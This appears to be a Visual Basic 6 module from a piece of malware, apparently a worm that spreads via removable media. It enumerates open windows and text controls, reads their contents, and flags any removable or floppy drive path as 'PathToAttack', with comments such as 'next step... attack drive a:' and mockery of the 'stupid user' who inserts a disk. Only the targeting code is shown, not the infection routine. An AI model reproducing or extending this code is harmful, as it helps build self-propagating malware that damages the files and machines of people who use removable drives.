Attribute VB_Name = "modWindowEnums"
Option Explicit

Public Declare Function EnumWindows Lib "user32" (ByVal lpEnumFunc As Long, ByVal lParam As Long) As Long
Public Declare Function EnumChildWindows Lib "user32" (ByVal hWndParent As Long, ByVal lpEnumFunc As Long, ByVal lParam As Long) As Long

Public Declare Function GetClassName Lib "user32" Alias "GetClassNameA" (ByVal hWnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long) As Long
Public Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hWnd As Long, ByVal lpString As String, ByVal cch As Long) As Long

Public Declare Function IsWindowVisible Lib "user32" (ByVal hWnd As Long) As Long

Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Private Declare Function SendMessageByString Lib "user32" Alias "SendMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As String) As Long

Const WM_GETTEXT = &HD
Const WM_GETTEXTLENGTH = &HE

Public RemovableDriveFound         As Boolean
Public Enumerate                   As Boolean

Function EnumWin(ByVal hWnd As Long, lParam As Long) As Long
     Dim str_WindowText  As String
     Dim FlopFnd         As Boolean
     
     ' get window caption from current enummerated handle.
     str_WindowText = fnGetWindowText(hWnd)
     
     If str_WindowText <> vbNullString Then
          ' everytime the timer loops
          ' set floppydrivefound to false
          ' so that blah-blah-blah
          RemovableDriveFound = False
          
          ' lets try to search from child control from the current enumerated window
          EnumChildWindows hWnd, AddressOf EnumChildCtls, 0
               
          ' yummy!
          ' a possible stupid user has inserted the floppy disk in FDD.
          If RemovableDriveFound Then
               ' stop enumerating for a while
               ' next step... attack drive a:
               Enumerate = False
               
               Exit Function  ' enough enumerating.
                              ' let me loop again after attacking drive a:
          End If
     End If
     
     EnumWin = 1
End Function

Function EnumChildCtls(ByVal hWnd As Long, lParam As Long) As Long
     Dim str_ClassName   As String
     Dim str_TextBox     As String
     
     Dim FlopFnd         As Boolean
     
     str_ClassName = fnGetClassName(hWnd)    ' i need the classname
     str_ClassName = UCase$(str_ClassName)
     
     ' i just need the TextBox or any other cursored control
     If (str_ClassName = "EDIT") Or _
        (InStr(1, str_ClassName, "TEXT") <> 0) Or _
        (InStr(1, str_ClassName, "EDIT") <> 0) Then
        
          ' get the Text in the control
          str_TextBox = fnGetTextBoxText(hWnd)
          str_TextBox = FSo.GetDriveName(str_TextBox)
          
          If str_TextBox <> vbNullString Then
               ' did i see the floppydrive or removable drive?
               If IsRemovableDrive(str_TextBox) Then
                    ' ohh yeh...
                    RemovableDriveFound = True
                    
                    PathToAttack = str_TextBox
                    
                    ' enough right now... let me scan again later.
                    Exit Function
               End If
          End If
     End If
     
     EnumChildCtls = 1
End Function

Function fnGetTextBoxText(ByVal Handle As Long) As String
     Dim vLen As Long
     Dim vText As String
     
     vLen = SendMessage(Handle, WM_GETTEXTLENGTH, 0, 0)
     vText = String(vLen, 0)
     
     If vLen > 255 Then vLen = 254
     
     SendMessageByString Handle, WM_GETTEXT, vLen + 1, vText
     
     fnGetTextBoxText = TrimRight(vText)
End Function

Function fnGetWindowText(ByVal lhwnd As Long) As String
     Dim lpString   As String * 1000
     Dim cch        As Long
     
     If IsWindowVisible(lhwnd) = False Then Exit Function
     
     If lhwnd <> 0 Then
          ' GetWindowText ----------------------------
          ' ------------------------------------------
          ' lpString: returns the Windows Caption
          ' ------------------------------------------
          GetWindowText lhwnd, lpString, Len(lpString)
          
          fnGetWindowText = TrimRight(lpString)
     End If
End Function

Function fnGetClassName(ByVal lhwnd As Long) As String
     Dim lpClassName     As String * 1000
     
     GetClassName lhwnd, lpClassName, Len(lpClassName)
     fnGetClassName = TrimRight(lpClassName)
End Function

Function TrimRight(ByVal sString As String)
     Dim i     As Integer
     
     If Len(sString) > 255 Then sString = Left$(sString, 255)
     
     For i = Len(sString) To 1 Step -1
          If Asc(Mid$(sString, i, 1)) <> 0 Then
               TrimRight = Left$(sString, i)
               Exit Function
          End If
     Next i
End Function
